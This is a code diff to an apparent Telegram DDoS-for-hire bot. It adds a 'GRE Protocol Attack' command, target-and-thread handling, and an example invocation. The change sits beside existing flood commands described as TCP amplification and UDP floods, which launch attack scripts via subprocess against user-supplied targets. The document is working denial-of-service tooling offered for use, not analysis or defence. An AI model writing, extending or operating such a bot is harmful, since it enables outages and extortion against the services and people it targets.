@@ -60,6 +60,7 @@ ATTACK_SCRIPTS = {
     # C-based converted attacks
     'killall': (os.path.join(BASE_DIR, "killall.py"), 2000),
     'udppps': (os.path.join(BASE_DIR, "udp-pps.py"), 3000),
+    'gre': (os.path.join(BASE_DIR, "gre.py"), 2000),
 }
 
 # ========== FUNCTIONS ==========
@@ -157,7 +158,12 @@ fallback_thread.start()
         os.chmod(temp_script, 0o755)
         
         # Start the attack
-        cmd = ["python3", temp_script, target, str(port), str(duration), str(threads)]
+        cmd = ["python3", temp_script, target, str(duration), str(threads)] if attack_type == 'gre' else ["python3", temp_script, target, str(port), str(duration), str(threads)]
+        
+        # Special handling for GRE (no port needed)
+        if attack_type == 'gre':
+            cmd = ["python3", temp_script, target, str(duration), str(threads)]
+        
         process = subprocess.Popen(
             cmd,
             stdout=subprocess.DEVNULL,
@@ -250,6 +256,7 @@ def start_command(message):
 🔥 C-BASED CONVERTED:
 /killall <target> <port> <time> - TCP Amplification
 /udppps <target> <port> <time> - UDP PPS Flood
+/gre <target> <time> <threads> - GRE Protocol Attack
 
 🛑 CONTROL:
 /stopall - Stop your attacks
@@ -297,6 +304,7 @@ BYPASS:
 C-BASED:
 /killall 1.2.3.4 80 60
 /udppps 1.2.3.4 80 60
+/gre 1.2.3.4 60 2000
 
 CONTROL:
 /stopall - Stop attacks
@@ -440,14 +448,28 @@ def make_handler(attack_type):
             return
 
         parts = message.text.split()
-        if len(parts) != 4:
-            bot.reply_to(message, f"Usage: /{attack_type} <target> <port> <time>")
-            return
-
-        target = parts[1]
-        try:
+        
+        # Special handling for GRE (no port)
+        if attack_type == 'gre':
+            if len(parts) != 4:
+                bot.reply_to(message, f"Usage: /gre <target> <time> <threads>")
+                return
+            target = parts[1]
+            duration = int(parts[2])
+            threads = int(parts[3])
+            port = 0  # GRE doesn't use port
+        else:
+            if len(parts) != 4:
+                bot.reply_to(message, f"Usage: /{attack_type} <target> <port> <time>")
+                return
+            target = parts[1]
             port = int(parts[2])
             duration = int(parts[3])
+
+        try:
+            if attack_type != 'gre':
+                port = int(port)
+            duration = int(duration)
         except:
             bot.reply_to(message, "❌ Port and time must be numbers")
             return
@@ -473,7 +495,7 @@ attacks = [
     'udpbypass', 'tcpbypass', 'gudp',
     'ultra', 'mega', 'nuclear', '10gbps', 'maxpower',
     'udpbypass10g', 'tcpbypass10g',
-    'killall', 'udppps'
+    'killall', 'udppps', 'gre'
 ]
 
 for attack in attacks:
